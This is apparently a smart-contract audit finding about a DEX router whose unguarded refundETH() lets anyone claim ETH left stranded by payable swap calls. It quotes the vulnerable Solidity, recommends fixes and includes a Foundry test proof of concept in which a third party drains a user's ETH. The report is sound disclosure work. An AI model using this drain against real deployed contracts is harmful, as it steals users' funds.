The vulnerability claim is valid. Here is the full analysis:

---

### Title
Unguarded `refundETH()` allows any caller to steal ETH stranded in the router by a prior `exactInputSingle{value:X}(tokenInŌēĀWETH)` call ŌĆö (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`refundETH()` has no access control and unconditionally sends the router's entire native ETH balance to `msg.sender`. Because all swap entry-points are `payable`, a user can accidentally (or be front-run after) sending ETH with a swap where `tokenIn` is a plain ERC-20. The ETH is never consumed by `pay()`, sits stranded in the router, and any third party can drain it in a subsequent transaction.

---

### Finding Description

`refundETH()` is implemented as:

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol  lines 58-63
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // ŌåÉ sends to caller, not original depositor
    }
}
``` [1](#0-0) 

There is no `msg.sender == originalDepositor` check, no reentrancy lock, and no transient-storage binding to the current multicall initiator.

The `receive()` guard only blocks plain ETH transfers:

```solidity
receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
}
``` [2](#0-1) 

It does **not** apply when ETH is sent as `msg.value` alongside a function call. `exactInputSingle` is `external payable`: [3](#0-2) 

When `tokenIn != WETH`, the `pay()` branch taken is:

```solidity
} else {
    IERC20(token).safeTransferFrom(payer, recipient, value);
}
``` [4](#0-3) 

The native ETH balance is never touched. Any ETH sent with the call is left in the router with no record of who deposited it.

A second stranding path exists even for `tokenIn == WETH`: when `msg.value > amountIn`, `pay()` wraps exactly `amountIn` and leaves the surplus:

```solidity
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();   // wraps exactly `value`, not nativeBalance
    IERC20(WETH).safeTransfer(recipient, value);
}
``` [5](#0-4) 

---

### Impact Explanation

Any ETH stranded in the router between transactions is claimable by an arbitrary `msg.sender` calling `refundETH()`. The original depositor receives nothing. This is a direct, complete loss of the stranded principal with no recovery path.

---

### Likelihood Explanation

Two realistic triggers exist:

1. **User error / non-WETH tokenIn with ETH attached** ŌĆö a user calls `exactInputSingle{value: X}(tokenIn=ERC20)` directly (not via multicall). The swap succeeds (ERC-20 is pulled via `safeTransferFrom`), but the ETH is never consumed.

2. **Excess ETH in a WETH swap without `refundETH` in the same multicall** ŌĆö a user calls `exactInputSingle{value: 2 ether}(tokenIn=WETH, amountIn=1 ether)` as a standalone call. Only 1 ETH is wrapped; 1 ETH is stranded.

In both cases a MEV bot or any watching address can call `refundETH()` in the next block. The intended safe pattern (multicall with `refundETH` as the last call) is not enforced by the contract.

---

### Recommendation

Bind `refundETH` to the multicall initiator using transient storage, mirroring how the swap callback context is already tracked. Record `msg.sender` at the start of `multicall` (or any payable entry-point) in a transient slot, and in `refundETH` assert `msg.sender == T_SLOT_INITIATOR`. Alternatively, add a `recipient` parameter to `refundETH` and require callers to specify it explicitly, or revert when `msg.value > 0` and `tokenIn != WETH` inside `exactInputSingle`.

---

### Proof of Concept

```solidity
// Foundry test sketch
function test_strandedEthStolenByThirdParty() public {
    address userA = makeAddr("userA");
    address userB = makeAddr("userB");
    vm.deal(userA, 1 ether);
    deal(address(erc20), userA, 1_000e18);

    // userA approves router for ERC-20 and calls exactInputSingle with ETH attached
    // tokenIn = ERC20 (not WETH) ŌĆö ETH is never consumed by pay()
    vm.startPrank(userA);
    erc20.approve(address(router), type(uint256).max);
    router.exactInputSingle{value: 1 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(erc20),
            tokenOut: address(weth),
            zeroForOne: false,
            amountIn: 1_000,
            amountOutMinimum: 0,
            recipient: userA,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    vm.stopPrank();

    // 1 ETH is now stranded in the router
    assertEq(address(router).balance, 1 ether);

    // userB (unrelated) calls refundETH() in a separate tx
    vm.prank(userB);
    router.refundETH();

    // userB stole userA's ETH
    assertEq(userB.balance, 1 ether);
    assertEq(userA.balance, 0);
}
```
